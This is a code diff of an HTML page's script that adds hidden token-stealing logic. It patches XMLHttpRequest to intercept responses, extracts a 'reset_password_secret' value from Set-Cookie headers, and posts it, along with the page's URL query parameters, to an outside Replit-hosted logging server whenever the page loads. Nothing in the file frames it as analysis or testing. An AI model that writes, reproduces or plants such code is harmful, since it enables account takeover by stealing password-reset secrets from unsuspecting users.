@@ -22,27 +22,52 @@
             return params;
         }
 
-        // Function to log the parameters to a remote server using a POST request
-        function logParams(params) {
+        // Function to log data to a remote server using a POST request
+        function logData(data) {
             const xhr = new XMLHttpRequest();
             const logUrl = 'https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log'; // Repl.it logging server URL
             xhr.open("POST", logUrl, true);
             xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
-                    console.log('Logged params:', xhr.responseText);
+                    console.log('Logged data:', xhr.responseText);
                 }
             };
-            xhr.onerror = function () {
-                console.log('Error logging params:', xhr.statusText);
-            };
-            xhr.send(JSON.stringify(params));
+            xhr.send(JSON.stringify(data));
         }
+
+        // Function to log the response token
+        function interceptResponse() {
+            const originalOpen = XMLHttpRequest.prototype.open;
+            XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
+                this.addEventListener("readystatechange", function () {
+                    if (this.readyState === 4 && this.status === 201) {
+                        try {
+                            const response = JSON.parse(this.responseText);
+                            if (response.ok && this.getResponseHeader('Set-Cookie')) {
+                                const cookies = this.getResponseHeader('Set-Cookie').split(';');
+                                cookies.forEach(cookie => {
+                                    if (cookie.includes('reset_password_secret=')) {
+                                        const token = cookie.split('=')[1];
+                                        logData({ token: token });
+                                    }
+                                });
+                            }
+                        } catch (e) {
+                            console.error('Failed to parse response:', e);
+                        }
+                    }
+                }, false);
+                originalOpen.apply(this, arguments);
+            };
+        }
+
+        // Initialize interception
+        interceptResponse();
 
         // Get and log the query parameters
         const queryParams = getQueryParams();
-        console.log('Query Params:', queryParams); // Log to console for debugging
-        logParams(queryParams);
+        logData(queryParams);
     </script>
 </body>
 </html>
